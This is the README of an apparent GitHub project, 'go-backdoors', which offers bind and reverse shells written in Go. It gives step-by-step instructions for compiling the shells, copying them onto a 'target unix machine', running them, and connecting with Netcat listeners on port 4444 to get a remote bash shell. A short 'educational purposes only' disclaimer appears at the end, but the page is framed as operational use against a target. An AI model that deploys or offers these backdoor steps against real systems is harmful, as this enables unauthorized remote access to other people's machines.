# go-backdoors

Simple reverse and bind shells written in Go. In order to use these backdoors, you will need to have Go installed on your machine. Notice that these shells are set up to use listeners on port 4444 by default. Feel free to change the ports used in the code to suit your needs, but be sure to adjust your **Netcat** connections accordingly. 

## Bind Shell

To use this bind shell, first compile it by running:

```bash
go build bindshell.go
```

This will create an executable file called `bindshell`. Copy this file onto the target unix machine, and give it the necessary permissions:

```bash
chmod +x ./bindshell
```

Finally, run it from whatever directory it is placed in with:

```bash
./bindshell
```

This will start the bind shell listening on port 4444. To connect to it, I recommend using **Netcat**:

```bash
nc <target-ip> 4444
```

Once you have completed this, you should be presented with a basic bash shell!

## Reverse Shell

To use the reverse shell, you will follow many of the same steps as before. First compile the code with:

```bash
go build revshell.go
```

Next, copy the created executable file `revshell` to the target machine, and give it exec permissions:

```bash
chmod +x ./revshell
```

This time, we will start a listener on our own machine in order to receive a connection from the target machine. I recommend using **Netcat** for this as well:

```bash
nc -lv 4444
```

Now whenever the reverse shell is run from the target machine, you will receive a connection to your listening port on your local machine and be granted a bash shell!

*Note: This project is for educational purposes only. I do not expect it to be perfect, but if you do have any questions about it please feel free to ask. You can reach me through github (I think?) or just send me an email at nineofpine@protonmail.com*
